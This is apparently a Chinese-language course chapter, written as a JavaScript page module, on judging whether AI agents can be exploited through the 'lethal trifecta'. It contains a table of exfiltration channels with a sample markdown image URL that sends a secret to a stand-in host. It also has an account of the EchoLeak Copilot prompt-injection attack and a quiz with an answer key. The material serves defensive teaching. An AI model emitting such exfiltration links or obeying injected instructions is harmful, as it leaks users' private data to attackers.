import { h2, h3, p, ul, ol, steps, kv, callout, detail, table, code, figure, svg, box, arrow, svgText, sim, range, select, toggle, button, out, pill } from '../../../lib/components.mjs';

export const meta = { time: 13, attacks: '可利用性测试' };
export const scripts = ['/assets/js/sims/zh/a03.js'];

const venn = svg(700, 380, `
${svgText(12, 18, '致命三元组', 'd-ttl', 'start')}
<circle cx="270" cy="150" r="112" fill="color-mix(in srgb, var(--attack-soft) 60%, transparent)" stroke="var(--attack)" stroke-width="1.5"/>
<circle cx="410" cy="150" r="112" fill="color-mix(in srgb, var(--boundary-soft) 60%, transparent)" stroke="var(--boundary)" stroke-width="1.5"/>
<circle cx="340" cy="262" r="112" fill="color-mix(in srgb, var(--trust-soft) 60%, transparent)" stroke="var(--trust)" stroke-width="1.5"/>
${svgText(206, 100, '私有数据', 'd-lbl')}
${svgText(206, 116, '它能读到的机密', 'd-sub')}
${svgText(478, 100, '不可信内容', 'd-lbl')}
${svgText(478, 116, '陌生人写的文本', 'd-sub')}
${svgText(340, 348, '对外通信', 'd-lbl')}
${svgText(340, 364, '字节出得去的路', 'd-sub')}
<circle cx="340" cy="186" r="30" fill="var(--attack)" opacity="0.16"/>
${svgText(340, 184, '可被', 'd-attack-t')}
${svgText(340, 200, '利用', 'd-attack-t')}
`, { label: '私有数据、不可信内容与对外通信的韦恩图' });

export const body = `
${p(`你不可能把每个智能体都保住，也不该去试。它们大多数并不会以本课程讨论的方式被利用，而把评审预算
花在那些身上，正是真正可被利用的那些一路上线却没人细看的原因。本章就是那道分诊测试。`)}

${h2('三条腿', 'three-legs')}

${p(`这套说法出自 Simon Willison，对照此后公开的每一起事件都出奇地站得住。当一个智能体同时具备下面
三样时，它在数据窃取上就是可被利用的：`)}

${kv([
  ['能访问私有数据', `攻击者想要的东西：你的文件、你的邮箱、你的数据库、你已认证的会话、另一个租户的
    记录。`],
  ['暴露于不可信内容', `任何让陌生人写下的文本抵达模型上下文的路径。一个抓来的网页、一封邮件、一条
    issue 评论、一份 PDF、一个文件名。`],
  ['具备对外通信的能力', `任何能让字节向外走的方式。注意这个措辞：不是“网络访问”，是任何方式。`],
])}

${figure(venn, `<b>风险在交集处。</b>两条腿的智能体，只是有个你以后能修的 bug。三条腿的智能体，是一个
网页上的一句话就能够到你的机密。审计一个系统时，先把这三条腿找出来，再去争论别的。`)}

${h2('给自己那个打分', 'lab')}

${p(`下面的实验里放了一组真实配置。逐条切换每条腿，看结论如何变化，再用自定义那一行给你真正在跑的
东西打分。`)}

${sim({
  name: 'a03trifecta',
  title: '三元组打分器',
  badge: '交互实验',
  controls: select('a03-cfg', '配置', [
    ['coding', '编码智能体 · 公开仓库 · 联网'],
    ['inbox', '收件箱整理智能体'],
    ['browse', '在你已登录配置里跑的浏览智能体'],
    ['wiki', '内部 wiki 问答 · 只读 · 无网络'],
    ['support', '基于公开 FAQ 的客服机器人'],
    ['report', '每夜报表 · 固定 SQL · 单一收件人'],
  ], 'coding'),
  body: `<div style="display:flex;gap:.6rem;flex-wrap:wrap;margin-bottom:.9rem">
    <button class="act sec" id="a03-t0" data-act>私有数据</button>
    <button class="act sec" id="a03-t1" data-act>不可信内容</button>
    <button class="act sec" id="a03-t2" data-act>对外通信</button></div>
    ${out('a03-out')}`,
  note: `点一条腿把它切掉，看看智能体因此做不了什么，也看看它因此不能再被拿来做什么。切掉任何一条腿
    都要付出能力上的代价；这个练习是在挑你最舍得的那一项能力。`,
})}

${h2('“它没有网络访问”是人们最常答错的一句', 'egress')}

${p(`切断出站通常是最便宜也最有效的一招，所以值得对“出站”到底指什么较个真。下面每一项都是外泄通道，
其中好几项里，智能体压根没有发出任何网络调用：`)}

${table(
  ['通道', '它怎么把数据送走', '谁发出的请求'],
  [
    ['渲染出来的 markdown 图片', '回答里的 <code>![](https://evil.example/?d=SECRET)</code>', '<b>客户端</b>，自动发出'],
    ['输出里的一个链接', '用户点开，机密就在查询串里', '用户的浏览器'],
    ['写进同步文件夹的文件', 'Dropbox 或 OneDrive 几分钟后把它传上去', '一个毫不相干的守护进程'],
    ['发给另一个智能体的消息', '那个智能体有这一个所缺的网络访问', '对端智能体'],
    ['一次 git 提交', 'CI 在下次运行时推送出去', '你的构建系统'],
    ['一次 DNS 查询', '主机名本身就是数据，解析器会记录每一次查询', '整条解析链'],
    ['一条错误信息', '<code>failed to parse sk_live_…</code> 落进了共享日志汇聚点', '你的可观测性栈'],
  ]
)}

${callout('attack', '为什么这件事比听上去更要紧', `<p style="margin-bottom:0">EchoLeak
（CVE-2025-32711）是针对 Microsoft 365 Copilot 的零点击数据外泄。用户没有点任何东西，智能体也没有
发出任何出站请求。被注入的内容让助手吐出了一张 markdown 图片，URL 里带着偷来的数据，而<em>渲染
客户端</em>去抓了它，因为渲染客户端本来就干这个。你在枚举出站时，要枚举智能体输出下游的一切东西的
能力，而不只是智能体自己的网络栈。</p>`)}

${h2('该切哪条腿', 'which-leg')}

${steps([
  ['切掉私有数据（有时是免费的）',
   `给智能体自己的身份和自己那份更小的数据集，而不是让它冒充用户。研究智能体很少需要你整个云盘，
    它需要的是三个文件夹。这就是 <a href="/zh/chapters/a22/">A22</a> 讲的最小权限工作，而且它往往比
    团队以为的更容易拿到，因为从来没有人问过最小是多少。`],
  ['切掉不可信内容（几乎没得选）',
   `你部署这个智能体的理由，就是它要去读东西。你可以把范围收窄（允许清单里的域名、第一方语料），
    但“第一方”不等于“可信”。你的 wiki 每个员工都能写，任何钓到其中一人的人也能写。
    <a href="/zh/chapters/a12/">A12</a> 讲的正是这个错误。`],
  ['切掉出站（通常最划算）',
   `一条只点名任务所需那两三个主机的出站策略，能把彻底沦陷变成被围住的沦陷。攻击者仍然掌握着模型的
    决策，但什么也拿不出去。<a href="/zh/chapters/a23/">A23</a> 会把它搭起来，包括上面那些客户端通道。`],
  ['一条也不切，但加一道闸（兜底）',
   `当三条腿都必须留着时，就给不可逆的动作配一个人，并让审批界面展示将要发送的数据，而不只是工具名。
    <a href="/zh/chapters/a24/">A24</a> 会解释细节为什么要紧，以及这道闸被滥用时如何失效。`],
])}

${h2('三元组是必要条件，不是充分条件', 'limits')}

${p(`两条诚实的告诫，因为一个被你过度信任的启发式，比没有启发式更糟。`)}

${ul([
  `<b>两条腿照样能伤到你。</b>三元组描述的是<em>数据窃取</em>。一个有不可信输入和破坏性工具、但没有
   私有数据的智能体没有外泄风险，却照样能删掉你的仓库。破坏、垃圾信息、资源耗尽和声誉损害都从这套
   说法旁边绕了过去。把 A01 里那份不可逆清单当作独立的一条轴保留下来。`,
  `<b>这三条腿是可传递的。</b>一个没有网络的智能体，把输出交给一个有网络的智能体，它就有了网络访问，
   只是中间洗了一手。多智能体系统（<a href="/zh/chapters/a15/">A15</a>）会用一堆单看都能通过测试的
   组件拼出一个三元组，这也是团队把自己说服进假阴性的最常见方式。`,
])}

${h2('现在你应该能做到', 'checkpoint')}

${ul([
  `在五分钟之内判定任何一个智能体是否可被利用，并说出你会切哪条腿。`,
  `列出六条不需要智能体发起网络请求的外泄通道。`,
  `解释为什么“内部语料”不等于“可信语料”。`,
  `说出三元组给出假阴性的那两种情形。`,
])}
`;

export const quiz = [
  {
    q: `一个智能体读取内部 wiki 页面，在聊天窗口里回答问题。除检索之外它没有别的工具，也没有网络
        出站。它凑齐三元组了吗？`,
    options: [
      `没有：没有出站，第三条腿是缺的。`,
      `凑齐了：它的回答会被一个真人读到并据此行动，那就是一条对外通信通道。`,
      `没有：wiki 是内部来源，所以内容不算不可信。`,
      `只有当 wiki 里含有机密时才算。`,
    ],
    answer: 1,
    explain: `一道题里两个坑。回答文本本身就是一条通道：被注入的指令可以让助手吐出一张客户端会自动抓取的
      markdown 图片、一个读者会点开的链接，或者干脆讲出一条斩钉截铁却完全错误的安全操作指引，而读者会
      照做。而“内部”是一句关于访问控制的话，不是关于信任的话。这份 wiki 每个员工都能写，任何攻陷了其中
      一个账号的人也能写，这正是 A12 要攻击的那个假设。`,
  },
  {
    q: `对于一个必须读取任意网页、并把它们总结成报告的研究智能体，下面哪条腿切起来最便宜？`,
    options: [
      `不可信内容：把它限制在十个域名的允许清单里。`,
      `私有数据：让它以一个只能访问输出文件夹的服务身份运行。`,
      `对外通信：它需要访问网页，所以这条切不了。`,
      `一条都不行；这个智能体本质上就不安全，不该造。`,
    ],
    answer: 1,
    explain: `不可信内容这条腿是任务本身定义的。限制到十个域名确实收窄了它，但那些域名照样由第三方可写，
      而且这样做把智能体的用途掏空了。出站可以部分切掉（即使阅读范围很宽，出站抓取仍然可以经允许清单
      代理），但读网页<em>本身</em>就是那次抓取。私有数据这条腿才是任务完全不需要的：一个把公开页面
      总结进指定文件夹的研究智能体，不需要访问你的邮件、你的密钥或你的云盘。给它自己的身份，最坏情况
      就从“报告被发给了陌生人”变成“报告写错了”。`,
  },
  {
    q: `为什么渲染出来的 markdown 图片是一条格外危险的外泄通道？`,
    options: [
      `图片可以携带隐写载荷。`,
      `客户端会自动去抓那个 URL，所以外泄是零点击的，而智能体自己没有发出任何出站请求。`,
      `markdown 渲染器会执行 JavaScript。`,
      `图片 URL 不受内容安全策略约束。`,
    ],
    answer: 1,
    explain: `请求是渲染客户端发的，不是智能体发的，这一下同时打掉两个控制：作用在智能体进程上的出站
      策略什么也看不到，而针对智能体动作的人工确认闸门根本不会触发，因为没有动作可批。这就是 EchoLeak
      的机制。缓解措施在客户端一侧：对 <code>img-src</code> 施加严格的 CSP，或者干脆不自动渲染智能体
      输出里的远程图片。`,
  },
  {
    q: `智能体 A 有私有数据、会读不可信内容，但没有网络。智能体 B 有网络但没有私有数据。A 把总结类
        任务委派给 B。安全态势是怎样的？`,
    options: [
      `安全，因为两个智能体谁也没有凑齐三条腿。`,
      `这一对凑齐了三条腿：A 的数据到了 B 手上，而 B 能把它送出去。`,
      `只要 B 校验自己的输入就是安全的。`,
      `不知道各自用的是什么模型就说不清。`,
    ],
    answer: 1,
    explain: `三条腿是会组合的。A 发给 B 的消息既是 A 的出站，也是 B 的不可信输入，所以哪怕每个组件
      单独看都通过了测试，组合起来的系统仍然可被利用。这是这套说法里最常见的假阴性，也是 A15 把多智能体
      拓扑当作一等攻击面来处理的原因：团队围着一个智能体画边界、验证它，却从来不围着整张图画边界。
      给整张图打分。`,
  },
  {
    q: `三元组这套说法<em>没有</em>覆盖下面哪种风险？`,
    options: [
      `一条被注入的指令把客户名单发给了攻击者。`,
      `一条被注入的指令在工作树上跑了 <code>rm -rf</code>。`,
      `一条被注入的指令读了私有仓库，并把摘要公开发了出去。`,
      `一条被注入的指令把 API 密钥贴进了一个渲染出来的链接里。`,
    ],
    answer: 1,
    explain: `破坏只需要不可信输入加一个破坏性工具，既不需要私有数据，也不需要外泄。三元组是一套针对
      <em>数据窃取</em>的测试，它在这件事上非常出色，但破坏、拒绝服务和声誉损害完全绕开了它。把 A01 里
      那份不可逆清单当作独立一轴保留，并注意两者的控制不同：窃取由出站策略来限，破坏由写入范围和快照
      来限。`,
  },
  {
    q: `某团队称他们的智能体是安全的，理由是“它没有网络访问，只往一个共享项目文件夹里写文件”。
        你首先该查什么？`,
    options: [
      `这些文件是否静态加密。`,
      `有没有别的东西在同步、索引、对外提供或执行那个文件夹。`,
      `模型是不是用他们的数据微调过。`,
      `文件写入有没有日志。`,
    ],
    answer: 1,
    explain: `只要下游有任何东西会搬走共享文件夹里的内容，这个文件夹就是出站：云同步、静态站点构建、
      搜索索引器、一个把它提交上去的 CI 任务，或者一台挂载了它的同事机器。“没有网络访问”是一句关于
      单个进程的陈述，而出站是整条数据路径的性质。静态加密、模型来源和日志都是合理的问题，但没有一个
      能告诉你字节会不会离开，而那才是眼下讨论的那条腿。`,
  },
];

export const refs = [
  { authors: 'Simon Willison', title: 'The lethal trifecta for AI agents: private data, untrusted content, and external communication',
    venue: 'simonwillison.net, June 2025', url: 'https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/',
    note: '本章赖以搭建的整套框架' },
  { authors: 'Simon Willison', title: 'Exfiltration attacks (tag archive)',
    venue: 'simonwillison.net', url: 'https://simonwillison.net/tags/exfiltration-attacks/',
    note: '持续更新的通道清单，其中多数看起来都不像网络访问' },
  { authors: 'Aim Labs', title: 'EchoLeak: zero-click data exfiltration in Microsoft 365 Copilot (CVE-2025-32711)',
    venue: 'Aim Security, 2025', url: 'https://www.aim.security/lp/aim-labs-echoleak-blogpost',
    note: '客户端渲染图片这条通道的端到端演示' },
  { authors: 'Kai Greshake, Sahar Abdelnabi, Shailesh Mishra, Christoph Endres, Thorsten Holz, Mario Fritz',
    title: 'Not What You\'ve Signed Up For: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection',
    venue: 'ACM AISec Workshop at CCS, 2023', url: 'https://arxiv.org/abs/2302.12173' },
  { authors: 'Johann Rehberger', title: 'ChatGPT Operator: Prompt Injection Exploits and Defenses',
    venue: 'Embrace The Red, February 2025',
    url: 'https://embracethered.com/blog/posts/2025/chatgpt-operator-prompt-injection-exploits/' },
  { authors: 'Yifeng He, Ethan Wang, Yuyang Rong, Zifei Cheng, Hao Chen',
    title: 'Security of AI Agents', venue: 'arXiv, 2024', url: 'https://arxiv.org/abs/2406.08689' },
  { authors: 'Keltin Grimes, Julie Lawler, Robert C. Garrett, Emil Mathew, Marco Christiani, Sara Kingsley, Zhiwei Steven Wu, Nathan VanHoudnos',
    title: 'SoK: Bridging Research and Practice in LLM Agent Security',
    venue: 'CMU Software Engineering Institute, 2025', url: 'https://doi.org/10.1184/R1/30610928' },
];
